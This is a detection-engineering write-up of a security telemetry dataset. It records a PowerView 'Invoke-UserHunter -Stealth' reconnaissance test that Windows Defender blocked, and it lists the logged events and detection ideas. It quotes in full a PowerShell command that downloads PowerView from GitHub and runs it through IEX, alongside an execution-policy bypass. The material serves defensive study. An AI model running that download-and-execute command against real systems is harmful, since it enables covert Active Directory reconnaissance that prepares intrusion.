# T1033-3: System Owner/User Discovery — Find computers where user has session - Stealth mode (PowerView)

## Technique Context

T1033 System Owner/User Discovery is a reconnaissance technique where adversaries gather information about the user accounts and sessions on systems within their target environment. This specific test uses PowerView's `Invoke-UserHunter -Stealth` function, which is designed to find computers where a specific user has sessions while minimizing network noise. PowerView is a popular PowerShell reconnaissance framework from PowerSploit that provides extensive Active Directory enumeration capabilities.

The "stealth mode" is particularly significant because it attempts to reduce detection by limiting network queries and using less noisy enumeration methods. Detection engineers focus on PowerShell script block logging, process creation of reconnaissance tools, and unusual network enumeration patterns. The technique is commonly used in the early stages of Active Directory attacks for lateral movement planning and privilege escalation target identification.

## What This Dataset Contains

This dataset captures a PowerView execution that was blocked by Windows Defender. The key telemetry includes:

**Process Creation Chain**: Security event 4688 shows the full command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose}`

**Sysmon Process Creation**: Event ID 1 captures the whoami.exe execution with command line `"C:\Windows\system32\whoami.exe"` and rule name matching T1033 technique detection.

**Process Access**: Sysmon event ID 10 shows PowerShell (PID 1504) accessing whoami.exe (PID 3296) with full access rights (0x1FFFFF), indicating process interaction during execution.

**Windows Defender Blocking**: The PowerShell process (PID 0x11d4) exits with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Defender blocked the PowerView download/execution.

**PowerShell Initialization**: The PowerShell channel contains only standard test framework boilerplate (`Set-StrictMode` and `Set-ExecutionPolicy Bypass` events) with no actual PowerView script blocks logged.

## What This Dataset Does Not Contain

This dataset lacks the actual PowerView execution telemetry because Windows Defender successfully blocked the technique. Missing elements include:

- PowerView script blocks in PowerShell event ID 4104 (only boilerplate captured)
- Network connections to download PowerView from GitHub
- LDAP queries or NetSessionEnum calls that PowerView would typically generate
- Active Directory enumeration artifacts
- Session discovery results or output

The Sysmon ProcessCreate events are limited due to the sysmon-modular include-mode filtering, which only captures suspicious processes like whoami.exe but not all child processes that PowerView might spawn.

## Assessment

This dataset provides excellent evidence of an **attempted** PowerView execution with strong preventive controls in action. The Security 4688 events with full command-line logging capture the complete attack attempt, making this valuable for detection engineering focused on PowerShell-based reconnaissance tools. The combination of process creation, process access, and exit status telemetry clearly demonstrates both the attack vector and the defensive success.

However, the dataset's utility is limited for understanding PowerView's actual execution behavior since Defender prevented completion. Detection engineers building rules for successful PowerView executions would need additional datasets where the technique completes.

## Detection Opportunities Present in This Data

1. **PowerView Download Pattern**: Command line containing `IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/'` with PowerView.ps1 download
2. **PowerView Function Invocation**: Command line containing `Invoke-UserHunter -Stealth` function call
3. **Reconnaissance Tool Process Creation**: Sysmon EID 1 with whoami.exe execution from PowerShell parent process
4. **Process Access for Reconnaissance**: Sysmon EID 10 showing PowerShell accessing system information gathering tools
5. **PowerShell Execution Policy Bypass**: PowerShell EID 4103 showing `Set-ExecutionPolicy Bypass` execution
6. **Blocked Malicious Activity**: Security EID 4689 with exit status 0xC0000022 indicating Defender intervention
7. **PowerSploit Repository Access**: URLs matching `raw.githubusercontent.com/PowerShellMafia/PowerSploit/` pattern in command lines
8. **Stealth Reconnaissance Indicators**: Command line parameters containing `-Stealth` flag with reconnaissance functions
